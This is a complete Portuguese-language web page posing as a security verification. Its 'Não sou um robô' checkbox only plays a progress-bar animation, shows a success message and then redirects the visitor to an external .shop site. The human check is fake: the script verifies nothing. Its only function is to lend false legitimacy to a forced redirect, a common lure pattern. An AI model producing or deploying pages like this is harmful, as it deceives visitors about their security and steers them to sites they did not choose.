<!DOCTYPE html>
<html lang="pt-br">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Verificação de Segurança</title>

<style>

body{
    margin:0;
    font-family: Arial, Helvetica, sans-serif;
    background: linear-gradient(135deg,#3b1f0f,#1a0d05);
    height:100vh;
    display:flex;
    align-items:center;
    justify-content:center;
}

.container{
    background:white;
    padding:40px;
    border-radius:15px;
    width:350px;
    text-align:center;
    box-shadow:0 10px 40px rgba(0,0,0,0.2);
    animation: aparecer 0.6s ease;
}

@keyframes aparecer{
    from{transform:scale(0.8);opacity:0}
    to{transform:scale(1);opacity:1}
}

h1{
    font-size:22px;
    margin-bottom:10px;
}

p{
    color:#666;
    font-size:14px;
}

.verificacao{
    margin-top:25px;
    border:2px solid #ddd;
    padding:15px;
    border-radius:8px;
    display:flex;
    align-items:center;
    cursor:pointer;
}

.checkbox{
    width:22px;
    height:22px;
    border:2px solid #999;
    margin-right:10px;
    display:flex;
    align-items:center;
    justify-content:center;
}

.checkbox span{
    display:none;
    color:green;
    font-weight:bold;
}

.loading{
    margin-top:20px;
    display:none;
}

.barra{
    width:100%;
    height:8px;
    background:#eee;
    border-radius:10px;
    overflow:hidden;
}

.progresso{
    width:0%;
    height:100%;
    background:#4CAF50;
}

.status{
    margin-top:8px;
    font-size:14px;
    color:#555;
}

</style>
</head>

<body>

<div class="container">

<h1>🔒 Verificação de Segurança</h1>
<p>Precisamos confirmar que você é humano para continuar.</p>

<div class="verificacao" onclick="verificar()">

<div class="checkbox" id="check">
<span>✔</span>
</div>

Não sou um robô

</div>

<div class="loading" id="loading">

<div class="barra">
<div class="progresso" id="progresso"></div>
</div>

<div class="status">Verificando segurança...</div>

</div>

</div>

<script>

function verificar(){

document.querySelector("#check span").style.display="block";

document.getElementById("loading").style.display="block";

let barra = document.getElementById("progresso");
let largura = 0;

let intervalo = setInterval(function(){

if(largura >= 100){
clearInterval(intervalo);

document.querySelector(".status").innerText="Verificação concluída ✔";

setTimeout(function(){
window.location.href="https://autoflexeconomiza.shop/";
},1000);

}

largura++;
barra.style.width = largura + "%";

},30);

}

</script>

</body>
</html>
